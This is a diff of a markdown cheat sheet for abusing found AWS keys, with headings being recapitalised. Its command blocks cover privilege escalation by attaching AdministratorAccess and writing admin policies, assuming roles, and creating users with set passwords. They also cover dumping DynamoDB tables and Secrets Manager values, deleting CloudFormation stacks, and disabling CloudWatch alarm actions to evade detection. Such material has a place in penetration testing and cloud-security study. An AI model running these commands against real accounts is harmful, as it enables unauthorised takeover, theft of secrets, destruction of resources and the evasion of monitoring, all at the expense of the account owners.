@@ -1,12 +1,12 @@
 So you found some aws keys...
 
-## caller id
+## Caller id
 who is me
 ```
 aws sts get-caller-identity
 ```
 
-## list, show stuff
+## List, show stuff
 ```
 aws ec2 describe-instances
 aws s3 ls
@@ -18,14 +18,14 @@ aws iam list-group-policies --group-name Admins
 ...
 ```
 
-## list (attached) policies
+## List (attached) policies
 ```
 aws iam list-attached-role-policies --role-name ad-example
 aws iam list-attached-user-policies --user-name user-example
 aws iam list-user-policies --user-name user-example
 ```
 
-## get policy
+## Get policies
 There are managed policies and inline policies, see [here](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html).
 Check especially for inline policies and everything custom, as these are a likly candidates for excessive permissions and priv esc
 ```
@@ -35,39 +35,40 @@ aws iam get-policy-version --policy-arn ... --version-id v1
 aws iam get-role-policy --role-name ... --policy-name ...
 ```
 
-## attach a policy
-attach aws admin policies
+## Attach a policy
+attach aws managed all admin policies
 ```
 aws iam attach-user-policy --user-name user-example --policy-arn ...
 aws iam attach-user-policy --user-name user-example --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 aws iam attach-group-policy --group-name developer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
-## add admin policy
+## Add policy
 add custom policy .json to group, role (needs your own policy file obviously)
 ```
 aws iam create-policy-version --policy-arn arn:aws:iam::666666666666:policy/Print --policy-document file:///.../newAdminPolicy.json --set-as-default
 aws iam put-group-policy --group-name Admins --policy-document file:///.../newAdminPolicy.json --policy-name AdminRoot
-aws iam put-role-policy --role-name developerlambda --policy-name adminnow --policy-document file:///.../newAdminPolicy.json      
+aws iam put-role-policy --role-name developerlambda --policy-name AdminMeow --policy-document file:///.../newAdminPolicy.json      
 ```
 
-## role policy
+## Role policy
 ```
 aws iam list-role-policies --role-name admin
 aws iam get-role-policy --role-name admin --policy-name AddUser
 ```
 
-## assume role
+## Assume role
+[![](https://www.youtube.com/watch?v=p3h8ZnXLsRg)
 ```
 aws sts assume-role --role-arn arn:aws:iam::666666666666:role/ad-example --role-session-name ad-example
 ```
 
-## search for adminstuff
+## Search for adminstuff
 ```
 aws iam list-policies | grep 'AdministratorAccess'  
 ```
 
-## add user to group, create user, change login
+## Add user to group, create user, change login
 ```
 aws iam add-user-to-group --group-name developer --user-name kevin
 aws iam create-login-profile --user-name mandy --password compliance123! --no-password-reset-required
@@ -95,18 +96,18 @@ aws ec2 create-key-pair --key-name nyankey --query 'KeyMaterial' --output text |
 chmod 400 mighty.pem
 ```
 
-## dynamodb
+## Dynamodb
 ```
 aws dynamodb list-tables | jq -r .TableNames[]
 aws dynamodb scan --table-name secrettable-233223 --region us-east-1
 ```
 
-## secret
+## Secret
 ```
 aws secretsmanager get-secret-value --secret-id ...--region
 ```
 
-## s3
+## S3
 list buckets, get objects, acl and policy
 ```
 aws s3 ls
@@ -163,13 +164,14 @@ aws cloudformation describe-stacks --stack-name stolenstack  --query Stacks[*].O
 aws cloudformation delete-stack --stack-name stolenstack --output text
 ```
 
-## Wiuuu wiuuu cloudwatch, sns
+## Wiuuu Wiuuu cloudwatch, sns
+If there are alarms monitoring in cloudwatch, sns and you have permissions, identify and if needed deactivate them. 
 ```
 aws cloudwatch describe-alarms --alarm-names "soundofdapolice"
 aws sns list-topics
 aws sns list-subscriptions
 ```
-## less wiuu wiuu
+## Less Wiuu Wiuu
 ```
 aws cloudwatch disable-alarm-actions --alarm-names soundofdapolice
 aws cloudwatch describe-alarm-history --alarm-name "iamshadow" --history-item-type StateUpdate
